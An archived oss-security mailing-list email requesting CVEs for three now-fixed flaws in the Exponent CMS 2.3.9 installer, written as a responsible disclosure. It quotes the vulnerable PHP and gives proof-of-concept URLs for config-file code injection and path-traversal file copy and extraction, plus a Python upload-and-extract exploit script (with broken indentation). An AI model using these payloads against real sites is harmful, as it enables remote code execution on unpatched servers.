X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4493" "Thursday" "22" "September" "2016" "21:35:46" "+0800" "Carl Peng" "felixk3y@gmail.com" "<CAEiFw0XGwYm+U74Fjs_UhZ3RvJhjN_uCV-kKb9zDcPsGhtk97A@mail.gmail.com>" "147" "[oss-security] CVE Request - Exponent CMS 2.3.9 multi-vulnerabilities in install code" nil nil nil "9" "2016092213:35:46" "[oss-security] CVE Request - Exponent CMS 2.3.9 multi-vulnerabilities in install code" (number mark "U       felixk3y@gma Sep 22  147/4493  " thread-indent "\"[oss-security] CVE Request - Exponent CMS 2.3.9 multi-vulnerabilities in install code\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1784 invoked by uid 550); 22 Sep 2016 14:27:46 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31828 invoked from network); 22 Sep 2016 13:35:58 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to;
        bh=/Xy0ibnF0VGStu9yu7kZlMU7FT8S0Sre+Y8I0JFNmZc=;
        b=HS5xUhh+mQ4LM50im5gFuf5noKzjkMUhIy2BO3MohbWpaj+jXapZ2J9q9tx1+rIGV6
         L4kGhBrMdpTYXX85fCcyPSZYRDkRc5yPksDtuMeCmXJOQvzbU67FM38s0mqMuNPDyDxE
         6N+KjNJFF+eCEzfi1UD6lBtL8U0jMrhbQUuieB4KQa3o2BycN0I+e8f6PVAPcYhRbb2i
         Xp6NKXJzBZbshSsW6Rfvnzq+Xr41uoVV0Z10wvpYhKXfbrBVVF5vbh7VwmJBk4tQSxxe
         UwjPEQCBWBWBSbH10CF9YBKEwr7hXuVWChmcVOp3b4D3c6897FiQffIRUELxQF+iJTp3
         vfNQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=/Xy0ibnF0VGStu9yu7kZlMU7FT8S0Sre+Y8I0JFNmZc=;
        b=Z+42VsKr8B+Gi+ZGkuP5a1ZdqUYRCUxdkNNFmGpBtHdRMbv3n0/QgPJzOafyEUAeXo
         LGz4w+RjLXDPaXX7e4lSUaJGJawE3/G2WOf7FhsvOXU9NMbZ2t8HYqmcTNt8LDkITYiT
         duBL4O6JhsmdfgcX2raS0ke6XUMUd7kY6afhDwttljTGmOGtuI0gyjX4eUDz5g9T1i4a
         sAQ6uLPFjGxhcEf58v70jXZVJbi1kcB5GMlyCp2575iKx3CpBb68al4GxfawqnD94P8o
         ppquv7r9ibtPQvTta0kkSMNJ8RMP+jaW0VLbrIuenktKCeK98shw/mz2zaFQ4JIqoWUm
         v70Q==
X-Gm-Message-State: AE9vXwOw+G/GZi+4dro2cE/YA7DEeHtAox3I/fDTgoSddlOQaahz2tJS5XjYSeQivpMCJPzFyYTaAGoZIN3qaA==
X-Received: by 10.195.9.73 with SMTP id dq9mr2060991wjd.31.1474551346974; Thu,
 22 Sep 2016 06:35:46 -0700 (PDT)
MIME-Version: 1.0
From: Carl Peng <felixk3y@gmail.com>
Date: Thu, 22 Sep 2016 21:35:46 +0800
Message-ID: <CAEiFw0XGwYm+U74Fjs_UhZ3RvJhjN_uCV-kKb9zDcPsGhtk97A@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=001a113620ea3d56f3053d18bdc4
Subject: [oss-security] CVE Request - Exponent CMS 2.3.9 multi-vulnerabilities in install code

--001a113620ea3d56f3053d18bdc4
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Hi , I reported the following vulnerabilities in the install code to the
ExponentCMS team some days ago and fixed now.

1. Arbitrary code execution
https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L=
56-L63
```
lines 56 - 63
if (isset($_REQUEST['sc'])) {
    if (file_exists("../framework/conf/config.php")) {
        // Update the config
        foreach ($_REQUEST['sc'] as $key =3D> $value) {
//            $value =3D expString::sanitize($value);
            expSettings::change($key, $value);
        }
    }
```
The function of the expSettings::change() is to modify the config
file("framework/conf/config.php"), but there is failed to filter user input
lead to we could write anything to config file.

Proof of concept:
http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=3D25\\');phpinfo=
();//
  phpinfo() will be executed.
Tips:
Visit " http://www.exponentcms.org/install/index.php?sc[SMTP_PORT]=3D25 " c=
an
be recovery it.


2. RCE vulnerability
https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L=
47-L53
```
if (isset($_REQUEST['profile'])) {
    expSettings::activateProfile($_REQUEST['profile']); //here
    expTheme::removeSmartyCache(); //FIXME is this still necessary?
    expSession::clearAllUsersSessionCache();
    flash('message', gt("New Configuration Profile Loaded"));
    header('Location: ../index.php');
}
```
expSettings::activateProfile() :
https://github.com/exponentcms/exponent-cms/blob/master/framework/core/subs=
ystems/expSettings.php#L587-L593
```
copy(BASE . "framework/conf/profiles/$profile.php", BASE .
"framework/conf/config.php"); //here
// tag it with the profile name
$fh =3D fopen(BASE . "framework/conf/config.php", "a");
```
We can upload a "php" file to website, then copy it to
"framework/conf/config.php"

Proof of concept:
first, We first upload a "php" to website (by =E2=80=9Cuploader_paste.php=
=E2=80=9D), such
as /files/test.php
then visit
http://www.exponentcms.org/install/index.php?profile=3D../../../files/test,
then will copy "/files/test.php" to "framework/conf/config.php".


3. File Upload vulnerability
https://github.com/exponentcms/exponent-cms/blob/master/install/index.php#L=
77-L94
```
$files =3D BASE . "themes/" . DISPLAY_THEME_REAL . "/" .
$_REQUEST['install_sample'] . ".tar.gz";
if (!file_exists($files)) {
    $files =3D BASE . "install/samples/" . $_REQUEST['install_sample'] .
".tar.gz"; //here
}
if (file_exists($files)) { // only install if there was an archive
    include_once(BASE . 'external/Tar.php');
    $tar =3D new Archive_Tar($files); //Extract .tar.gz file
    $return =3D $tar->extract(BASE);
}
```
The function of those code is extract .tar.gz file, but through
"install_sample", the parameter of "$files" is what we can control, so we
could upload a .tar.gz evil file, then extract it.

Proof of concept:
first, upload .eql and .tar.gz files(by =E2=80=9Cuploader_paste.php=E2=80=
=9D),such as
/files/10.tar.gz
then visit
http://www.exponentcms.org/install/index.php?install_sample=3D../../files/10
Successfully extract file:  http://www.exponentcms.org/3.php

python poc code:
```
import random
import requests
host =3D 'http://www.exponentcms.org/'

def upload(name, url):
files =3D {'upload' : (name, open('evil.tar.gz'))}
resp =3D requests.post(url, files=3Dfiles)
return resp.content

if 'http://' not in host: host =3D 'http://{}'.format(host)

host =3D host.rstrip('/')
url =3D '{}/framework/modules/file/connector/uploader_paste.php'.format(hos=
t)
rstr =3D random.randint(10,99)

req_eql =3D upload('{}.eql'.format(rstr), url)
req_tar =3D upload('{}.tar.gz'.format(rstr), url)

if 'tar.gz' in req_tar:
req_inc =3D
requests.get('{}/install/index.php?install_sample=3D../../files/{}'.format(=
host,
rstr))

evilfile =3D '{}/3.php'.format(host)
req_ =3D requests.get(evilfile)

if 'GIF89a' in req_.content:
print evil-file
```

And now, all vulnerabilities have been fixed.
https://exponentcms.lighthouseapp.com/projects/61783/changesets/4ae457ff1bf=
80e8b61286cd125ca794b25564e86
https://github.com/exponentcms/exponent-cms/commit/4ae457ff1bf80e8b61286cd1=
25ca794b25564e86


these issues was reported by Peng Hua of silence.com.cn Inc. and I would
like
to request  CVEs for these issues (if not done so).


-------------------http://www.silence.com.cn/
penghua@silence.com.cn
PKAV Team

--001a113620ea3d56f3053d18bdc4--
